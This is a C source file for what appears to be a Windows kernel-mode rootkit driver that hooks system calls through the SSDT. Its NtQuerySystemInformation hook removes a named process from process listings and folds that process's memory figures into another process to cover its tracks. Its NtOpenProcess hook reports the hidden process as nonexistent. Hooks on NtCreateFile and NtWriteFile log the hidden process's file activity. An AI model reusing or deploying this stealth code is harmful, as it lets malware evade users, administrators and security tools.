#include "EPROCESS.h"
#include "NtFunctionsHooks.h"
#include "SYSTEM_THREAD_INFORMATION.h"
#include "SYSTEM_PROCESS_INFORMATION.h"
#include "SystemServiceDescriptorTableHook.h"

void hideProcessInformation(SYSTEM_PROCESS_INFORMATION* processInformationToHide, SYSTEM_PROCESS_INFORMATION* nextProcessInformation, DWORD32 length)
{
	// the structures need to be offset by this much (by process to hide structure size)
	// could also be (DWORD32)((BYTE*)nextProcessInformation - (BYTE*)processInformationToHide)
	DWORD32 processInformationToHideSize = processInformationToHide->NextEntryOffset;

	// clear the memory
	RtlZeroMemory(processInformationToHide, processInformationToHideSize);

	RtlMoveMemory(processInformationToHide, nextProcessInformation, length);

	// clear the memory where processes previously resided,
	// i.e. clear the last `processInformationToHideSize` bytes because it's trash there now
	RtlZeroMemory((void*)((DWORD32)nextProcessInformation + length - processInformationToHideSize), processInformationToHideSize);
	
	while(1)
	{
		processInformationToHide->ImageName.Buffer = (WCHAR*)((BYTE*)processInformationToHide->ImageName.Buffer - processInformationToHideSize);

		if(!processInformationToHide->NextEntryOffset)
			break;

		processInformationToHide = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)processInformationToHide + processInformationToHide->NextEntryOffset);
	}
}

NTSTATUS NTAPI ntQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS SystemInformationClass, VOID* SystemInformation, ULONG SystemInformationLength, ULONG* ReturnLength)
{
	NTSTATUS status = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if(SystemInformationClass != SystemProcessInformation || !ReturnLength)
		return status;

	if(!NT_SUCCESS(status) || !SystemInformation)
	{
		extern EPROCESS* clientProcess;

		*ReturnLength -= sizeof(SYSTEM_PROCESS_INFORMATION) + sizeof(SYSTEM_THREAD_INFORMATION) * clientProcess->ActiveThreads + wcslen(CLIENT_PROGRAM_NAME) * sizeof(WCHAR) + sizeof(DWORD32);

		return status;
	}
	
	SYSTEM_PROCESS_INFORMATION* process = SystemInformation;

	// assuming firstProcess is System Idle Process ('System')
	SYSTEM_PROCESS_INFORMATION* firstProcess = process;

	SYSTEM_PROCESS_INFORMATION* previousProcess = SystemInformation;

	while(1)
	{
		__try
		{
			if(process->ImageName.Buffer)
			{
				if(wcscmp(process->ImageName.Buffer, CLIENT_PROGRAM_NAME) == 0)
				{
					DbgPrint("Found %ls. First process name = %wZ\n", CLIENT_PROGRAM_NAME, &firstProcess->ImageName);
					
					DbgPrint("My process:\n");
					DbgPrint("\tPagefileUsage = %X\n", process->PagefileUsage);
					DbgPrint("\tPeakPagefileUsage = %X\n", process->PeakPagefileUsage);
					DbgPrint("\tPrivatePageCount = %X\n", process->PrivatePageCount);

					DbgPrint("First process:\n");
					DbgPrint("\tPagefileUsage = %X\n", firstProcess->PagefileUsage);
					DbgPrint("\tPeakPagefileUsage = %X\n", firstProcess->PeakPagefileUsage);
					DbgPrint("\tPrivatePageCount = %X\n", firstProcess->PrivatePageCount);

					firstProcess->PagefileUsage += process->PagefileUsage;
					
					if(firstProcess->PeakPagefileUsage < process->PagefileUsage)
						firstProcess->PeakPagefileUsage = process->PagefileUsage;
					
					firstProcess->PrivatePageCount += process->PrivatePageCount;

					// summing quota usage could cause it to be bigger than actual quota
					// firstProcess->QuotaPagedPoolUsage += process->QuotaPagedPoolUsage;
					// firstProcess->QuotaNonPagedPoolUsage += process->QuotaNonPagedPoolUsage;

					DWORD32 nextEntryOffset = process->NextEntryOffset;

					// if it's the last process
					if(!nextEntryOffset)
					{
						DWORD32 processSize = (DWORD32)SystemInformation + *ReturnLength - (DWORD32)process;

						RtlZeroMemory(process, processSize);

						*ReturnLength -= processSize;

						break;
					}

					DWORD32 nextProcess = (DWORD32)process + nextEntryOffset;

					// copy from the next process to the end in the place of old process
					hideProcessInformation(process, (SYSTEM_PROCESS_INFORMATION*)nextProcess, (DWORD32)SystemInformation + *ReturnLength - nextProcess);

					// decrease by as many bytes as there are from current address to the next one
					// i.e. decrease by the structure's size
					*ReturnLength -= nextEntryOffset;

					break;
				}
			}

			if(!process->NextEntryOffset)
				break;

			previousProcess = process;

			process = (SYSTEM_PROCESS_INFORMATION*)((DWORD32)process + process->NextEntryOffset);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			DbgPrint("Exception %X\n", GetExceptionCode());
		}
	}

	return status;
}

NTSTATUS NTAPI ntOpenProcessHook(HANDLE* ProcessHandle, ACCESS_MASK DesiredAccess, OBJECT_ATTRIBUTES* ObjectAttributes, CLIENT_ID* ClientId)
{
	EPROCESS* process;

	NTSTATUS status = PsLookupProcessByProcessId(ClientId->UniqueProcess, &process);

	if(!NT_SUCCESS(status))
	{
		DbgPrint("PsLookupProcessByProcessId failed with code %X\n", status);

		return status;
	}

	UNICODE_STRING imageFileName;

	getProcessImageFileName(process, &imageFileName);

	UNICODE_STRING nameToFind;

	RtlInitUnicodeString(&nameToFind, CLIENT_PROGRAM_NAME);

	extern HANDLE clientPID;
	
	// if the process for which NtOpenProcess is being called is the client process that's to be hidden then return STATUS_INVALID_CID
	// which means invalid PID - process doesn't exist
	if(ClientId->UniqueProcess == clientPID)
		return STATUS_INVALID_CID;

	return NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS
NTAPI
ntCreateFileHook(
PHANDLE FileHandle,
ACCESS_MASK DesiredAccess,
POBJECT_ATTRIBUTES ObjectAttributes,
PIO_STATUS_BLOCK IoStatusBlock,
PLARGE_INTEGER AllocationSize,
ULONG FileAttributes,
ULONG ShareAccess,
ULONG CreateDisposition,
ULONG CreateOptions,
PVOID EaBuffer,
ULONG EaLength
)
{
	extern EPROCESS* clientProcess;

	if(PsGetCurrentProcess() == clientProcess && ObjectAttributes && ObjectAttributes->ObjectName)
		DbgPrint(
					"NtCreateFile \"%wZ\":\n"
					"\tDesiredAccess = %X\n"
					"\tFileAttributes = %X\n"
					"\tCreateDisposition = %X\n"
					"\tCreateOptions = %X\n\n", ObjectAttributes->ObjectName, DesiredAccess, FileAttributes, CreateDisposition, CreateOptions);

	return NtCreateFile(FileHandle,
							  DesiredAccess,
							  ObjectAttributes,
							  IoStatusBlock,
							  AllocationSize,
							  FileAttributes,
							  ShareAccess,
							  CreateDisposition,
							  CreateOptions,
							  EaBuffer,
							  EaLength
							  );
}

NTSTATUS NTAPI ntWriteFileHook(
	HANDLE           FileHandle,
	HANDLE           Event,
	PIO_APC_ROUTINE  ApcRoutine,
	PVOID            ApcContext,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	PLARGE_INTEGER   ByteOffset,
	PULONG           Key
	)
{
	extern EPROCESS* clientProcess;

	if(PsGetCurrentProcess() == clientProcess)
		DbgPrint(
					"NtWriteFile:\n"
					"\tFile handle: %X\n"
					"\tEvent: %X\n"
					"\tIoStatusBlock: %X\n"
					"\tBuffer: %X | length: %X\n"
					"\tByte offset: %X, Key: %X\n\n", FileHandle, Event, IoStatusBlock, Buffer, Length, ByteOffset, Key);

	return NtWriteFile(FileHandle,
								Event,
								ApcRoutine,
								ApcContext,
								IoStatusBlock,
								Buffer,
								Length,
								ByteOffset,
								Key);
}